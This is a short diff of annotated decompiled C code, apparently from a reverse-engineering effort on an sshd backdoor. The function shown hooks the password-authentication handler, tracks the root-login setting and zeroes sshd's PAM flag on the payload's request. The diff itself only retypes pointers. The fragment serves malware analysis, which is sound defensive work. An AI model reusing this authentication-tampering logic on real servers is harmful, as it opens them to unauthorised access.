@@ -22,7 +22,7 @@ BOOL sshd_patch_variables
   sshd_ctx_t *sshd_ctx;
   sshd_monitor_func_t authpassword_hook;
   int *permit_root_login_ptr;
-  uint *use_pam_ptr;
+  int *use_pam_ptr;
   
   // AutoDoc: Refuse to run until the global ctx, sshd_ctx, and mm_answer_authpassword hook are all populated.
   if ((((global_ctx == (global_context_t *)0x0) ||
@@ -50,8 +50,8 @@ BOOL sshd_patch_variables
   }
   // AutoDoc: Zero `use_pam` only when sshd exposed a writable pointer and the payload asked for the PAM bypass.
   if (disable_pam != FALSE) {
-    use_pam_ptr = (uint *)sshd_ctx->use_pam_ptr;
-    if (use_pam_ptr == (uint *)0x0) {
+    use_pam_ptr = sshd_ctx->use_pam_ptr;
+    if (use_pam_ptr == (int *)0x0) {
       return FALSE;
     }
     if (1 < *use_pam_ptr) {
